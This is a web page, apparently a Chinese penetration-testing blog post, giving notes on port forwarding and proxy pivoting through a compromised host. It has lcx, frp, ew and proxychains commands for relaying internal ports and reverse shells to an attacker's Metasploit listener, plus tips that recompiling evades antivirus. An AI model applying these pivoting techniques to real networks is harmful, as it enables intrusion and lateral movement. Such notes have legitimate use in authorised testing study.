@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>边界代理及端口转发</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="边界代理及端口转发">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-09-04">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-09-04">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="端口转发">
+        
+          <meta 
+            property="og:article:tag" 
+            content="边界代理">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      边界代理及端口转发
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-09-04T06:57:40.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-09-04</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          内网渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>850 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+            class="post-meta-link">
+            端口转发
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86/" 
+            class="post-meta-link">
+            边界代理
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p><strong>情景：</strong></p>
+<p>A：hacker</p>
+<p>B：靶机</p>
+<p>C：内网</p>
+<table>
+<thead>
+<tr>
+<th>方向</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A - &gt;   B -&gt; C  <br>主动连接</td>
+<td>B有防火墙时，需要把C端口转到B,B端口再转到A，访问A端口即可  <br>B没有防火墙时，直接把C端口映射到B,访问B端口即可</td>
+</tr>
+<tr>
+<td>C -&gt;   B -&gt; A  <br>反弹shell</td>
+<td>C出网时，可以主动反弹到A的端口，A监听即可     <br>C不出网时，只能反弹到B端口，再通过lcx转发到A端口，注意端口保持相同</td>
+</tr>
+</tbody></table>
+<h2 id="lcx-神器"><a href="#lcx-神器" class="headerlink" title="lcx(神器)"></a>lcx(神器)</h2><p>为什么要说是神器，因为后面frp和边界代理虽然是双向流量，但是并不能反弹shell，必须借助lcx进行端口转发。</p>
+<p>LCX使用</p>
+<p>在目标之上使用，及中间机器，用来打内网</p>
+<p>A：攻击机</p>
+<p>B：靶机</p>
+<p>C：内网机器</p>
+<p>注意：重新编译可以过特征码杀软</p>
+<p>makefile+lcx.c编译：<code>make</code></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>lcx -tran 7788 内网ip  6379</td>
+<td>把C的6379转发到B的7788</td>
+</tr>
+<tr>
+<td>lcx -tran 7789 公网ip  7789</td>
+<td>端口需要设置为相同，否则msf无法上线</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>lcx -slave 公网ip  443 内网ip 端口</td>
+<td>把C的6379转发到A的7788</td>
+</tr>
+<tr>
+<td>lcx  -listen 443 9005</td>
+<td>监听A的443出口和9005入口</td>
+</tr>
+</tbody></table>
+<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>frp（稳定性强）</p>
+<p>只能配置入网，需要配合lcx配置出网</p>
+<p>将 frps 及 frps.ini 放到具有公网 IP 的机器上，作为服务端</p>
+<p>配置：</p>
+<p>默认即可</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">frps.exe -c frps.ini</span><br></pre>
+
+<p>将 frpc 及 frpc.ini 放到处于内网环境的机器上（被控靶机），作为客户端</p>
+<p>配置：</p>
+<pre class="highlight"><span class="line">[common]</span><br><span class="line"></span><br><span class="line">server_addr = x.x.x.x（服务器ip）</span><br><span class="line"></span><br><span class="line">server_port = 7000（默认端口）</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line"></span><br><span class="line">type = tcp</span><br><span class="line"></span><br><span class="line">local_ip = 127.0.0.1（要攻击的内网ip）</span><br><span class="line"></span><br><span class="line">local_port = 22（要攻击的内网端口）</span><br><span class="line"></span><br><span class="line">remote_port = 6000（服务端ip）</span><br></pre>
+
+<p>使用：</p>
+<pre class="highlight"><span class="line">frpc.exe reload -c frpc.ini 重新加载</span><br></pre>
+
+<p><strong>注意：</strong><br> 使用msf时，需要使用lcx将靶机（中间机）的监听端口转发到msf的监听端口，两个端口号保持一致，msf监听靶机IP和端口即可</p>
+<h1 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h1><p>分类</p>
+<p>HTTP代理</p>
+<p>SOCKS代理</p>
+<p>Telnet代理</p>
+<p>SSL代理</p>
+<table>
+<thead>
+<tr>
+<th>代理类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>正向代理</td>
+<td>内向外，服务器对流量进行转发</td>
+</tr>
+<tr>
+<td>反向代理</td>
+<td>外向内请求，根据域名区分，分发到不同内部网络  对外表现为多个域名为同一个ip地址</td>
+</tr>
+</tbody></table>
+<p> <strong>代理和vpn区别</strong></p>
+<p>代理：</p>
+<p>​    传输层，tcp、udp、http、https流量</p>
+<p>​    默认不包含终端</p>
+<p>VPN：</p>
+<p>​    路由层，icmp、dns、http、arp流量</p>
+<p>​    默认包含终端</p>
+<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>sockts5代理工具</p>
+<p> 注：需要使用lcx将靶机的监听端口转发到msf的监听端口（端口号一致）</p>
+<p><strong>使用：</strong></p>
+<p>无防火墙：</p>
+<p>配置代理：被控靶机ip:8080</p>
+<p>访问内网ip、端口</p>
+<pre class="highlight"><span class="line">ew -s ssocksd -l 8080		# 被控靶机</span><br></pre>
+
+<p>有防火墙：</p>
+<p>配置代理：公网ip:1080</p>
+<p>访问内网ip、端口</p>
+<pre class="highlight"><span class="line">ew -s rcsocks -e 8888 -l 1080		# 公网服务器</span><br><span class="line">ew -s rssocks -d 公网ip -e 8888		# 被控靶机</span><br></pre>
+
+
+
+<h2 id="代理工具使用"><a href="#代理工具使用" class="headerlink" title="代理工具使用"></a>代理工具使用</h2><p>windows：</p>
+<p>proxifier</p>
+<p>此处nmap扫描端口时不能使用ping的方式，所以需要使用Pn禁ping</p>
+<p>nmap -Pn -sT 1.1.1.1</p>
+<p>linux：</p>
+<p>proxychains4-ng</p>
+<p>安装：apt install proxychains4-ng</p>
+<p>配置文件：/etc/proxychains.conf，文件末尾只配置一个有效代理</p>
+<p>使用：proxychains4 命令</p>
+<p>注意：部分软件会丢失参数，py文件最好使用python启动</p>
+<p><strong>补充</strong></p>
+<p>go版本ew（免杀，可重新编译）</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>公网服务器：</td>
+<td>go_ew  8888 1080</td>
+</tr>
+<tr>
+<td>被控靶机：</td>
+<td>go_ew 公网ip:8888</td>
+</tr>
+</tbody></table>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+            https://www.zerochen.top/article/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/hash%E4%BC%A0%E9%80%92/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">hash传递 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx-%E7%A5%9E%E5%99%A8"><span class="toc-text">lcx(神器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp"><span class="toc-text">frp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-text">代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ew"><span class="toc-text">ew</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">代理工具使用</span></a></li></ol></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>52</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>11</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>51</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx-%E7%A5%9E%E5%99%A8"><span class="toc-text">lcx(神器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp"><span class="toc-text">frp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-text">代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ew"><span class="toc-text">ew</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">代理工具使用</span></a></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          内网渗透
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%AE%89%E6%9C%8D/">
+        <div class="categories-list-item">
+          安服
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86/" 
+        title="边界代理">
+        <div class="tags-list-item">边界代理</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+        title="端口转发">
+        <div class="tags-list-item">端口转发</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" 
+        title="权限维持">
+        <div class="tags-list-item">权限维持</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
+        title="综合靶场">
+        <div class="tags-list-item">综合靶场</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx-%E7%A5%9E%E5%99%A8"><span class="toc-text">lcx(神器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp"><span class="toc-text">frp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-text">代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ew"><span class="toc-text">ew</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">代理工具使用</span></a></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-04</div>
+        <a href="/article/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"><div class="recent-posts-item-content">边界代理及端口转发</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-04</div>
+        <a href="/article/hash%E4%BC%A0%E9%80%92/"><div class="recent-posts-item-content">hash传递</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-04</div>
+        <a href="/article/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"><div class="recent-posts-item-content">Windows密码抓取</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-28</div>
+        <a href="/article/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"><div class="recent-posts-item-content">权限维持</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
